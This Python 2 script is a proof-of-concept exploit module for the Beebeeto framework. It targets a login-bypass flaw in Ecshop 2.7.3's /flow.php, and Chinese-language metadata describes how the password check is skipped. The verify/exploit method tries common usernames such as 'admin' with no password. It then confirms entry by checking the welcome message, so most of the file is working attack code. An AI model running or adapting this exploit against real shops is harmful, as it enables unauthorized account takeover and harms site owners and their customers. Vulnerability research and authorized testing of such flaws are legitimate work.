#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import urllib
import urllib2
import cookielib

from baseframe import BaseFrame


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2014-0086',
            'name': 'Ecshop 2.7.3 /flow.php 登录绕过漏洞 POC',
            'author': 'foundu',
            'create_date': '2014-10-20',
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',
            'port': [80],
            'layer4_protocol': ['tcp'],
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'Ecshop',
            'vul_version': ['2.7.3'],
            'type': 'Login Bypass',
            'tag': ['Ecshop漏洞', '登录绕过漏洞', '/flow.php'],
            'desc': '''
                    登录操作最终执行check_user方法，当用户密码为null时，只判断用户名。
                    而在flow.php中并没有对密码进行判断或者初始化。可以只通过账号就可以实现登录。
                    ''',
            'references': ['http://wooyun.org/bugs/wooyun-2014-063655',
            ],
        },
    }


    @classmethod
    def verify(cls, args):
        username_list = ['admin', 'ecshop', 'vip', 'test', '123456']
        for username in username_list:
            test = "您好，<b class=\"username\">"+username+"</b>，欢迎您回来！"
            try:
                # reg cookies
                cj = cookielib.LWPCookieJar()
                opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cj))
                urllib2.install_opener(opener)
                # request
                verify_url = args['options']['target'] + '/flow.php?step=login'
                postdata = urllib.urlencode({
                    'act':'signin',
                    'username': username
                })
                if args['options']['verbose']:
                    print '[*] Request URL: ' + verify_url
                    print '[*] POST Data: ' + postdata
                req = urllib2.Request(
                    url = verify_url,
                    data = postdata,
                )
                content = urllib2.urlopen(req).read()
            except:
                continue
            if urllib2.urlopen(req).geturl() == args['options']['target'] + "/index.php":
                if test in content:
                    args['success'] = True
                    args['poc_ret']['vul_url'] = verify_url
                    args['poc_ret']['post_data'] = postdata
                    return args
            args['success'] = False
        args['success'] = False
        return args

    exploit = verify


if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())